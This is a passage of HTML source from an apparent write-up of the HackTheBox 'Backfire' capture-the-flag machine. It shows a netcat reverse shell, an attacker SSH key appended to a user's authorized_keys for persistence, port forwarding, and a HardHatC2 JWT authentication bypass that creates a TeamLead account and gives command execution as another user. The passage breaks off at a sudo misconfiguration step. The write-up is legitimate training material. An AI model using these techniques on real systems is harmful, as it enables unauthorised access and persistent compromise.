&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">poll&lt;/span> &lt;span class="nx">teamserver&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span>&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Read&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span> &lt;span class="nx">successfully&lt;/span>&lt;span class="p">!&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>As the reverse shell was unstable and kept disconnecting, we add our public SSH key to Ilyas SSH authorized_keys file for a more stable access.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
&lt;/span>&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">lvnp&lt;/span> &lt;span class="mi">80&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">listening&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="kt">any&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="mi">80&lt;/span> &lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">connect&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mf">10.10.14.173&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nf">from&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">UNKNOWN&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="mi">60884&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">echo&lt;/span> &lt;span class="s">&amp;#34;ssh-ed25519 A...k kali@kali&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ilya&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">authorized_keys&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ilya&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">authorized_keys&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ed25519&lt;/span> &lt;span class="nx">A&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="nx">k&lt;/span> &lt;span class="nx">kali&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>Then, we can access the server via SSH and grab the user flag.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
&lt;/span>&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
&lt;/span>&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="p">~&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">id_ed25519&lt;/span> &lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">files&lt;/span> &lt;span class="nx">hardhat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">b96&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="mo">016&lt;/span>&lt;span class="nx">b&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="lateral-mouvement-sergej">Lateral mouvement: Sergej
&lt;/h2>&lt;h3 id="exploit-hardhat-c2-authentification-bypass--rce">Exploit HardHat C2: Authentification bypass + RCE
&lt;/h3>&lt;p>Inside &lt;code>Ilya&lt;/code>s home directory, there is a file called &lt;code>hardhat.txt&lt;/code> containing the following content:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
&lt;/span>&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">files&lt;/span> &lt;span class="nx">hardhat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">hardhat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Sergej&lt;/span> &lt;span class="nx">said&lt;/span> &lt;span class="nx">he&lt;/span> &lt;span class="nx">installed&lt;/span> &lt;span class="nx">HardHatC2&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">testing&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">not&lt;/span> &lt;span class="nx">made&lt;/span> &lt;span class="kt">any&lt;/span> &lt;span class="nx">changes&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">defaults&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">I&lt;/span> &lt;span class="nx">hope&lt;/span> &lt;span class="nx">he&lt;/span> &lt;span class="nx">prefers&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">bcoz&lt;/span> &lt;span class="nx">I&lt;/span> &lt;span class="nx">don&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="nx">wanna&lt;/span> &lt;span class="nx">learn&lt;/span> &lt;span class="nx">another&lt;/span> &lt;span class="nx">C2&lt;/span> &lt;span class="nx">framework&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">also&lt;/span> &lt;span class="nx">Go&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">C&lt;/span>&lt;span class="err">#&lt;/span> &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Checking the open ports confirms that a &lt;code>HardHat&lt;/code> instance, another command and control server, is running on the machine:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 4
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 5
&lt;/span>&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">netstat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">planetu&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">..&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Proto&lt;/span> &lt;span class="nx">Recv&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Q&lt;/span> &lt;span class="nx">Send&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Q&lt;/span> &lt;span class="nx">Local&lt;/span> &lt;span class="nx">Address&lt;/span> &lt;span class="nx">Foreign&lt;/span> &lt;span class="nx">Address&lt;/span> &lt;span class="nx">State&lt;/span> &lt;span class="nx">User&lt;/span> &lt;span class="nx">Inode&lt;/span> &lt;span class="nx">PID&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Program&lt;/span> &lt;span class="nx">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5000&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1001&lt;/span> &lt;span class="mi">50679&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7096&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1001&lt;/span> &lt;span class="mi">51911&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">40056&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">54307&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">443&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">21679&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">22&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">22673&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8000&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">21680&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8443&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">53569&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">55332&lt;/span> &lt;span class="mf">10.10.14.156&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">80&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">54389&lt;/span> &lt;span class="mi">4854&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">40056&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">35702&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">53582&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">35702&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">40056&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">54337&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">272&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">22&lt;/span> &lt;span class="mf">10.10.14.156&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">36602&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">53621&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp6&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">:::&lt;/span>&lt;span class="mi">22&lt;/span> &lt;span class="p">:::&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">22684&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">udp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">68&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">15357&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">udp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">43747&lt;/span> &lt;span class="mf">8.8.8.8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">997&lt;/span> &lt;span class="mi">54599&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">udp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">58233&lt;/span> &lt;span class="mf">8.8.8.8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">1001&lt;/span> &lt;span class="mi">53738&lt;/span> &lt;span class="o">-&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">udp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">44241&lt;/span> &lt;span class="mf">8.8.8.8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">1001&lt;/span> &lt;span class="mi">54632&lt;/span> &lt;span class="o">-&lt;/span> &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Since &lt;code>Sergej&lt;/code> made no changes to the default configuration of the C2, we will rely on the following article to compromise his account:
&lt;a class="link" href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7" target="_blank" rel="noopener"
>https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7&lt;/a>&lt;/p>
&lt;p>More specifically, we focus on vulnerabilities 2 and 3.&lt;/p>
&lt;p>The first vulnerability, an authentication bypass, exploits the fact that HardHat uses a static key to sign JWTs, which here allows us to create authentication tokens for any role.&lt;/p>
&lt;p>We then forward the port 5000 to use the script from the article and create a new user with the role of &lt;code>TeamLead&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">L&lt;/span> &lt;span class="mi">5000&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5000&lt;/span> &lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>In the script, we set set the &lt;code>rhost&lt;/code>parameter to &lt;code>rhost = 'localhost:5000'&lt;/code> and proceed to create our new user.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="hl">&lt;span class="lnt">6
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">python3&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">exploit&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Generated&lt;/span> &lt;span class="nx">JWT&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ey&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="nx">oH6CDUNc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">sth_pentest&lt;/span> &lt;span class="nx">created&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Now that our user has been created, we&amp;rsquo;ll exploit the second vulnerability to achieve code execution through the HardHat interface available on port 7096.&lt;/p>
&lt;p>First, we forward this port and log in using our &lt;code>stj_pentest&lt;/code> account.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">L&lt;/span> &lt;span class="mi">7096&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7096&lt;/span> &lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Next, we will access the &lt;code>ImplantInteract&lt;/code> page to use the integrated console.&lt;/p>
&lt;p>We confirm that commands are executed as &lt;code>Sergej&lt;/code>, so we add our public key to this user&amp;rsquo;s authorized_keys file in order to connect via SSH.&lt;/p>
&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console1.png"
width="972"
height="752"
srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console1_hu_e2d8a9fb05755c10.png 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console1_hu_9ef9514df24c6ed0.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="310px"
>&lt;/p>
&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console2.png"
width="961"
height="119"
srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console2_hu_f16c283fb5549909.png 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console2_hu_61a1feae2d5c74e2.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="807"
data-flex-basis="1938px"
>&lt;/p>
&lt;h2 id="root">Root
&lt;/h2>&lt;h3 id="sudo-misconfiguration">Sudo misconfiguration
&lt;/h3>&lt;p>Once connected via SSH, we notice a misconfiguration of the sudo utility for the user &lt;code>Sergej&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 3
&lt;/span>&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 5
&lt;/span>&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="hl">&lt;span class="lnt">17
